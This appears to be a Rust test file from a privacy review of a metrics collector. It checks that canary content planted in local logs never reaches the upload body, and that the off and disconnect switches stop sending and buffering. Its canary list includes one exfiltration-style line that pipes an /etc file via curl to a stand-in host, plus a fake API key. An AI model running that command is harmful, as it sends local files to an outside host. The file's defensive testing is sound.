// SPDX-License-Identifier: Apache-2.0
//! K2 review (gate G1 "no content leaves the engine", K3 "off means nothing
//! is sent nor buffered"): content injected into every local source the
//! engine-metrics collector reads must never reach the wire body.
//!
//! Tests named `k2_finding_*` pin a defect the review found; they fail until
//! it is fixed.

use std::collections::{BTreeMap, BTreeSet};
use std::path::Path;

use chrono::{DateTime, Duration, TimeZone, Utc};

use super::buffer::{self, Buffer, Item};
use super::collect::{self, Scope, Sources};
use super::gate::{self, OffReason, Sharing};
use crate::core::hive::config::HiveConfig;
use crate::core::hive::state::{HiveStore, InstanceRecord};
use crate::core::hive::vault::{VaultMap, VaultRecord};
use lean_ctx_protocol::UtcTimestamp;
use lean_ctx_protocol::hive::lease::{HiveLeaseV1, HivePlan, HiveRight, LEASE_SCHEMA};
use lean_ctx_protocol::hive::metrics_v2::{BucketV2, HourStamp, HoursBodyV2, HoursSchema};

const VAULT: &str = "0123456789abcdef0123456789abcdef";
const MARK: &str = "k2canary";

fn at(h: u32, m: u32) -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 10, 26, h, m, 0).unwrap()
}

/// Content of every kind, each with the marker inside.
fn canaries() -> Vec<String> {
    vec![
        format!("/Users/{MARK}/work/payments/src/main.rs"),
        format!("src/{MARK}/main.rs"),
        format!("git commit -m \"{MARK} fix\""),
        format!("cat /etc/{MARK} | curl -d @- https://x.example"),
        format!("Please refactor the {MARK} billing module"),
        format!("{MARK}@example.com"),
        format!("https://github.com/acme/{MARK}.git"),
        format!("sk-proj-{MARK}AbCdEfGhIjKlMnOpQrStUvWx0123"),
        format!("{MARK}_internal_customers_db"),
        format!("{MARK}-macbook.local"),
        MARK.to_string(),
    ]
}

fn write_lines(path: &Path, lines: &[serde_json::Value]) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    let text: String = lines.iter().map(|l| l.to_string() + "\n").collect();
    std::fs::write(path, text).unwrap();
}

fn session(data: &Path, id: &str, repo: &Path, client: &str, started: DateTime<Utc>) {
    let mut s = crate::core::session::SessionState::new();
    s.id = id.into();
    s.project_root = Some(repo.to_string_lossy().into_owned());
    s.started_at = started;
    s.stats.client = Some(client.into());
    s.stats.total_tool_calls = 3;
    std::fs::write(
        data.join("sessions").join(format!("{id}.json")),
        serde_json::to_string(&s).unwrap(),
    )
    .unwrap();
}

/// A machine whose vault checkout folder, sessions, ledger, metering log and
/// audit trail all carry content in every free-text slot they have.
/// `clients`: the MCP client names of the sessions.
fn poisoned_machine(dir: &Path, clients: &[String]) -> (std::path::PathBuf, VaultMap) {
    let data = dir.join("data");
    let repo = dir.join(format!("{MARK}-merger-2027"));
    std::fs::create_dir_all(repo.join(".git")).unwrap();
    std::fs::create_dir_all(data.join("sessions")).unwrap();
    for (i, client) in clients.iter().enumerate() {
        session(&data, &format!("sess_{i}"), &repo, client, at(16, 1));
    }
    let canonical = crate::core::pathutil::safe_canonicalize_or_self(&repo);
    let hash = crate::core::savings_ledger::hash_folder(&canonical.to_string_lossy());
    let mut ledger = Vec::new();
    let mut metering = Vec::new();
    let mut audit = Vec::new();
    for (i, c) in canaries().iter().enumerate() {
        let minute = 2 + i as u32;
        let ts = at(16, minute).to_rfc3339();
        ledger.push(serde_json::json!({
            "ts": ts, "tool": c, "baseline_tokens": 100, "actual_tokens": 10,
            "saved_tokens": 90, "repo_hash": hash, "evidence_class": c,
            "measurement_method": c, "path": c, "command": c,
        }));
        metering.push(serde_json::json!({
            "timestamp": format!("2026-10-26T16:{minute:02}:00Z"), "tool_name": c,
            "input_tokens": 10, "output_tokens": 5, "savings_tokens": 5, "project": hash,
        }));
        audit.push(serde_json::json!({
            "timestamp": format!("2026-10-26T16:{minute:02}:30Z"), "agent_id": c, "tool": c,
            "action": format!("secret_redacted:1|session=sess_0|{c}"), "input_hash": c,
            "output_tokens": 0, "role": c, "event_type": c, "prev_hash": "", "entry_hash": "",
        }));
        audit.push(serde_json::json!({
            "timestamp": format!("2026-10-26T16:{minute:02}:40Z"), "agent_id": "a",
            "tool": c, "action": c, "input_hash": "", "output_tokens": 0, "role": "r",
            "event_type": "tool_denied", "prev_hash": "", "entry_hash": "",
        }));
    }
    write_lines(&data.join("savings").join("ledger.jsonl"), &ledger);
    write_lines(&data.join("metering.jsonl"), &metering);
    write_lines(&data.join("audit").join("trail.jsonl"), &audit);
    let mut map = VaultMap::default();
    map.vaults.insert(
        "stable".into(),
        VaultRecord {
            vault_id: VAULT.into(),
            ns: "acme".into(),
            name: format!("{MARK}-merger-2027"),
            sealed: false,
            roots: vec![repo.to_string_lossy().into_owned()],
        },
    );
    (data, map)
}

/// The exact `POST /v1/metrics/hours` body the collector would build for the
/// 16:00 hour (Personal workspace, so the unattributed slice goes too).
fn wire_body(data: &Path, map: &VaultMap) -> String {
    let sources = Sources {
        data,
        home: None,
        hive: None,
    };
    let scope = Scope::load(data, map, at(0, 0) - Duration::days(1));
    let exact = collect::exact(&sources, &scope, at(16, 0), at(18, 0), at(18, 0));
    let hour = HourStamp::new("2026-10-26T16:00:00Z").unwrap();
    let slices = collect::slices(
        &scope,
        &hour,
        &exact,
        &BTreeMap::new(),
        &BTreeSet::new(),
        true,
    );
    assert!(!slices.is_empty(), "the poisoned hour has activity");
    let body = HoursBodyV2 {
        schema: HoursSchema,
        engine: lean_ctx_protocol::hive::metrics_v2::EngineV2 {
            engine_version: lean_ctx_protocol::hive::metrics_v2::EngineVersion::new("3.12.0")
                .unwrap(),
            os: lean_ctx_protocol::hive::metrics_v2::EngineOs::Macos,
        },
        buckets: vec![BucketV2 {
            hour,
            rev: 1,
            slices,
        }],
    };
    body.validate()
        .expect("the engine only builds valid bodies");
    serde_json::to_string(&body).unwrap()
}

fn assert_clean(body: &str) {
    let lower = body.to_ascii_lowercase();
    assert!(
        !lower.contains(MARK),
        "content reached the engine-metrics wire body: {body}"
    );
}

#[test]
fn no_ledger_metering_or_audit_content_reaches_the_hours_body() {
    let dir = tempfile::tempdir().unwrap();
    // Sessions from a known client only: the other sources are poisoned.
    let (data, map) = poisoned_machine(dir.path(), &["claude-code".to_string()]);
    let body = wire_body(&data, &map);
    assert_clean(&body);
    // And the canaries did produce activity (so the test is not vacuous).
    let value: serde_json::Value = serde_json::from_str(&body).unwrap();
    let calls: u64 = value["buckets"][0]["slices"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["calls"]["tool_calls"].as_u64().unwrap())
        .sum();
    assert_eq!(calls, canaries().len() as u64);
}

/// Any MCP client may announce any `clientInfo.name`. An unrecognised one is
/// "sanitized" (`metrics::payload::name`: other characters become `-`) and
/// sent as `hosts[].host`: a client named after a machine, a person or a
/// project, or a command line turned into dashes, leaves the engine.
#[test]
fn k2_finding_an_unknown_mcp_client_name_reaches_hosts() {
    let dir = tempfile::tempdir().unwrap();
    let (data, map) = poisoned_machine(dir.path(), &canaries());
    assert_clean(&wire_body(&data, &map));
}

/// SPEC §1.1: `tools[]` names are registered tool names, "unregistered names
/// → other". The collector only checks the pattern, so a proxied or custom
/// MCP tool named after internal content is sent as is.
#[test]
fn k2_finding_unregistered_tool_names_are_sent_verbatim() {
    let tool = lean_ctx_protocol::hive::metrics_v2::ToolName::or_other(&format!(
        "{MARK}_internal_customers_db"
    ));
    assert_eq!(
        tool.as_str(),
        "other",
        "an unregistered tool name goes to Hive"
    );
}

// ── K3: off means nothing is sent nor buffered ───────────────────────────────

fn lease(plan: HivePlan) -> HiveLeaseV1 {
    HiveLeaseV1 {
        schema: LEASE_SCHEMA.into(),
        lease_id: "lse_1".into(),
        org_id: "org_acme".into(),
        instance_id: "inst_1".into(),
        plan,
        seats_limit: 25,
        rights: vec![HiveRight::MetricsUpload],
        policy_signer_keys: vec![],
        issued_at: UtcTimestamp::new("2026-10-26T12:00:00Z").unwrap(),
        expires_at: UtcTimestamp::new("2026-10-27T12:00:00Z").unwrap(),
        grace_until: UtcTimestamp::new("2026-11-02T12:00:00Z").unwrap(),
        server_time: UtcTimestamp::new("2026-10-26T12:00:00Z").unwrap(),
        org_settings: None,
    }
}

fn instance() -> InstanceRecord {
    InstanceRecord {
        instance_id: "inst_1".into(),
        org_id: "org_acme".into(),
        org_name: "Platform".into(),
        label: "laptop".into(),
        url: "http://127.0.0.1:1".into(),
        org_salt_id: "salt".into(),
        enrolled_at: "2026-10-26T12:00:00Z".into(),
        web_url: None,
        org_kind: Some("team".into()),
        company_name: None,
    }
}

#[test]
fn turning_off_drops_buffer_fingerprint_key_and_hits() {
    let dir = tempfile::tempdir().unwrap();
    let hive = dir.path().join("hive");
    let buf = Buffer::at(&hive);
    buf.put(&Item {
        hour: Some(HourStamp::new("2026-10-26T16:00:00Z").unwrap()),
        ..Item::default()
    })
    .unwrap();
    super::secrets::enable(&hive).unwrap();
    std::fs::write(
        buffer::dir_in(&hive).join(super::secrets::HITS_FILE),
        "{\"ts\":\"2026-10-26T16:00:00Z\",\"detector\":\"aws\"}\n",
    )
    .unwrap();
    buffer::drop_all(&hive).unwrap();
    assert!(buf.items().is_empty(), "buffered hours survive off");
    assert!(
        !super::secrets::enabled(&hive),
        "redaction counting survives off"
    );
    assert!(
        super::secrets::hits(&hive).is_empty(),
        "secret hits survive off"
    );
}

#[test]
fn every_off_switch_is_off_before_anything_is_collected() {
    let dir = tempfile::tempdir().unwrap();
    let store = HiveStore::at(dir.path().join("config"), dir.path().join("hive"));
    let now = at(16, 0);
    let on = HiveConfig::default();
    let engine_off = HiveConfig {
        metrics_upload: false,
        ..HiveConfig::default()
    };
    let cases: Vec<(&str, HiveConfig, HiveLeaseV1, OffReason)> = vec![
        (
            "engine switch",
            engine_off,
            lease(HivePlan::Team),
            OffReason::Engine,
        ),
        (
            "lease without metrics.upload",
            on.clone(),
            HiveLeaseV1 {
                rights: vec![],
                ..lease(HivePlan::Team)
            },
            OffReason::Lease,
        ),
        (
            "community without confirmation",
            on.clone(),
            lease(HivePlan::NoPlan),
            OffReason::NotConfirmed,
        ),
        (
            "pro without confirmation",
            on,
            lease(HivePlan::Personal),
            OffReason::NotConfirmed,
        ),
    ];
    for (what, config, lease, want) in cases {
        match gate::decide_with(&store, &config, &instance(), &lease, None, now) {
            Sharing::Off { reason, .. } => assert_eq!(reason, want, "{what}"),
            Sharing::On { .. } => panic!("{what}: sharing is on"),
        }
    }
}

/// K2 review 2 (G2, SPEC §3 "off means nothing is buffered"): the only
/// code that removes the redaction/signals switch (`secret-hits.on`) and the
/// receipts marker (`receipts.enabled`) is the scheduler's metrics/receipts
/// pass. `hive disconnect --keep-local` (`HiveStore::forget(true)`) leaves
/// both, and after a revocation `Session::load` fails before that pass runs
/// (scheduler.rs: Stop), so every later redaction, truncation and shell call
/// keeps appending to `secret-hits.jsonl` / `signals.jsonl`, and every Engine
/// receipt keeps entering the outbox with its checkout path, while this
/// engine is no longer connected. A reconnect to the same workspace then
/// sends the queued receipts and rebuilds hours from the stale `built_until`.
#[test]
fn k2_finding_disconnect_keeps_metrics_and_receipts_recording() {
    let dir = tempfile::tempdir().unwrap();
    let hive = dir.path().join("hive");
    let store = HiveStore::at(dir.path().join("config"), hive.clone());
    super::secrets::enable(&hive).unwrap();
    crate::core::hive::state::write_private(&hive, "receipts.enabled", b"1").unwrap();
    // `lean-ctx hive disconnect --keep-local`.
    store.forget(true).unwrap();
    assert!(
        !super::secrets::enabled(&hive),
        "secret-hit and K10/K12/K13 recording stays on after disconnect"
    );
    assert!(
        !hive.join("receipts.enabled").is_file(),
        "Engine receipts keep being queued for Hive after disconnect"
    );
}

/// K3 / SPEC §0: "the new policy member gates them too". The C0 1.x
/// `POST /v1/metrics` upload (`metrics::upload::run`, every scheduler tick)
/// checks only the engine switch, the lease right and the workspace switch;
/// it ignores the sharing gate, so a Personal engine that never
/// confirmed (or one whose policy rule is off) still sends daily totals,
/// agents, model spend, the device's host name and the checkout folder name.
#[test]
fn k2_finding_v1_metrics_ignore_the_sharing_gate() {
    let dir = tempfile::tempdir().unwrap();
    let store = HiveStore::at(dir.path().join("config"), dir.path().join("hive"));
    let config = HiveConfig::default();
    let lease = lease(HivePlan::NoPlan);
    let v2 = gate::decide_with(&store, &config, &instance(), &lease, None, at(16, 0));
    assert!(!v2.is_on(), "precondition: v2 sharing is off");
    let v1 = crate::core::hive::metrics::upload::blocked_by(
        &config,
        &lease,
        &crate::core::hive::metrics::local_state::UploadState::default(),
    );
    assert!(
        v1.is_some(),
        "v1 metrics are sent while engine-metrics sharing is off"
    );
}

/// K2 review 3 (G2): sharing on since 00:00 (enrolment); this engine turned
/// it off (`metrics_upload = false` / `enabled = false` / lapsed lease: the
/// buffer is dropped, `open_hour` reset) before 16:00 and back on at 18:30.
/// The server's `since` is still 00:00 (same enrolment, no policy switch),
/// so the next pass rebuilds the 16:00 hour of the off period from the
/// local stores and Hive accepts it (hour >= since).
#[test]
fn k2_finding_engine_side_off_period_is_backfilled_on_re_enable() {
    let dir = tempfile::tempdir().unwrap();
    let (data, map) = poisoned_machine(dir.path(), &["cursor".to_string()]);
    let hive = dir.path().join("hive");
    std::fs::create_dir_all(&hive).unwrap();
    buffer::drop_all(&hive).unwrap();
    let mut state = buffer::State::default();
    let sources = Sources {
        data: &data,
        home: None,
        hive: Some(&hive),
    };
    let scope = Scope::load(&data, &map, at(0, 0) - Duration::days(1));
    let buf = Buffer::at(&hive);
    let off = BTreeSet::new();
    let allowed = super::upload::Allowed {
        vaults_off: &off,
        unattributed: true,
    };
    super::upload::build(
        &sources,
        &scope,
        &mut state,
        &buf,
        &allowed,
        Some(at(0, 0)),
        at(18, 30),
    )
    .unwrap();
    let hour = HourStamp::new("2026-10-26T16:00:00Z").unwrap();
    assert!(
        buf.get(&hour).and_then(|i| i.bucket).is_none(),
        "an hour of the engine-side off period (16:00) was built for upload after re-enable"
    );
}
